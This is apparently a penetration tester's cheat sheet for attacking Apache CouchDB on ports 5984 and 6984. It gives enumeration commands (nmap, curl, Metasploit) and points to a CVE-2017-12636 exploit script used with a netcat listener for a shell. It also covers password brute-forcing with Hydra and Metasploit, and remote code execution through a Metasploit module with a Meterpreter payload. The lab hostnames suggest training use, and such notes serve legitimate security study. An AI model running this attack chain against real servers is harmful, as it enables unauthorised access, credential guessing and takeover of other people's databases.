# 5984, 6984 (CouchDB)

## Enumeration

### Automatic

```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```

### Manual

```bash
curl http://<IP>:5984
# Banner grab (Can also open in a browser)
curl http://<IP>:5984/_all_dbs
# List of all the databases
curl http://user:password@<IP>:5984/_all_dbs
# List of all the databases with authentication
curl http://<IP>:5984/<DB name>
# List database information
curl http://<IP>:5984/<DB name>/_all_docs
# List each entry inside of a database
curl http://<IP>:5984/<DB name>/<ID>
# Read content of a document in a database
curl http://10.10.202.192:5984/_utils/
# Path for the web administration tool
```

## Exploitation

### Unprotected

#### CVE-2017-12636

Since we should have administrative access here we should be able to find an exploit to execute.

* Found: [https://github.com/moayadalmalat/CVE-2017-12636](https://github.com/moayadalmalat/CVE-2017-12636)
* Download code and update the **target** and **command** variables in the script
* Start a netcat listener: `nc -lvnp 4444`
* Run the exploit: `python3 exploit.py`

### Protected

Since we do NOT have access we will need to get access.

#### Brute Force

Hydra

```bash
hydra -l admin -P /opt/100-common-passwords.txt -s 5984 -f <IP> http-get /_utils
# And we get the password
```

Metasploit

```bash
use auxiliary/scanner/couchdb/couchdb_login
set RHOSTS demo2.ine.local
set USERNAME admin
set PASS_FILE /root/Desktop/wordlists/100-common-passwords.txt
set STOP_ON_SUCCESS True
set VERBOSE true
exploit
```

#### RCE

Metasploit

```bash
search couchdb
use exploit/linux/http/apache_couchdb_cmd_exec
set PAYLOAD linux/x64/meterpreter/bind_tcp
set RHOSTS <IP>
set LHOST <IP>
set httpusername admin
set httppassword madalina
exploit
```
